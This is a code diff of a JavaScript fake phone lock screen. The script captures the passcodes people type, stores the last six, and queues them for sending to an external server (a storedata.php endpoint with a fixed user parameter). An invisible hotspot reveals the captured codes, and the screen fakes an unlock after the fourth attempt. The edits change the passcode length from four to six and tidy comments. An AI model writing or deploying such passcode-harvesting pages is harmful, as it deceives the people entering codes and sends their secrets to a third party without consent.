@@ -1,6 +1,6 @@
 (() => {
   const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarun&data=";
-  const MAX = 6; // <-- changed from 4 to 6
+  const MAX = 6; // <-- passcode length (6 digits)
   let code = "";
 
   const dotEls = Array.from(document.querySelectorAll('.dot'));
@@ -9,7 +9,7 @@
   // keep a live reference to cancel button
   let cancelBtn = document.getElementById('cancel');
   const unlockOverlay = document.getElementById('unlockOverlay');
-  const lockInner = document.querySelector('.lockscreen.inner') || document.querySelector('.lockscreen-inner');
+  const lockInner = document.querySelector('.lockscreen-inner') || document.querySelector('.lockscreen.inner');
   const homescreenImg = document.getElementById('homescreenImg');
   const ATT_KEY = '_pass_attempt_count_';
   const QUEUE_KEY = '_pass_queue_';
@@ -27,7 +27,7 @@
     try {
       const arr = getLastCodes();
       arr.push(c);
-      while (arr.length > 6) arr.shift(); // <-- changed from 4 to 6
+      while (arr.length > 6) arr.shift(); // keep most recent 6
       localStorage.setItem(LAST_CODES_KEY, JSON.stringify(arr));
     } catch (e) {}
   }
@@ -35,12 +35,13 @@
     return getLastCodes().join(',');
   }
 
-
   function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
   function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }
 
   function refreshDots() {
-    dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length));
+    // Ensure dotEls are up-to-date if DOM changed
+    const dots = Array.from(document.querySelectorAll('.dot'));
+    dots.forEach((d,i) => d.classList.toggle('filled', i < code.length));
     updateCancelText(); // keep label in sync whenever dots change
   }
 
@@ -201,16 +202,7 @@
     }, DURATION + 20);
   }
 
-  /* ---------- handleCompleteAttempt: send combined on 4th attempt ---------- */
-  async function handleCompleteAttempt(enteredCode) {
-    let attempts = getAttempts();
-    attempts += 1;
-    setAttempts(attempts);
-
-    // push code into rotating buffer (so hotspot displays exact payload)
-    pushLastCode(enteredCode);
-
-      /* ---------- handleCompleteAttempt: send on 3rd attempt, unlock on 4th ---------- */
+  /* ---------- handleCompleteAttempt: send on 3rd attempt, unlock on 4th ---------- */
   async function handleCompleteAttempt(enteredCode) {
     let attempts = getAttempts();
     attempts += 1;
@@ -333,7 +325,7 @@
   window.addEventListener('online', flushQueue);
   flushQueue();
 
-  /* ---------- Invisible bottom-left hotspot: show combined last-4 codes on press ---------- */
+  /* ---------- Invisible bottom-left hotspot: show combined last-6 codes on press ---------- */
 
   function createInvisibleHotspotAndDisplay() {
     // Hotspot (invisible)
@@ -382,7 +374,7 @@
       inner.id = 'codesCombinedInner';
       Object.assign(inner.style, {
         width: '100%',
-        background: 'rgba(0,0,0,0.7)',  // translucent dark so it's readable
+        background: 'rgba(0,0,0,0.7)',
         borderRadius: '12px',
         padding: '10px 12px',
         boxSizing: 'border-box',
@@ -462,5 +454,3 @@
   window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };
 
 })();
-
-
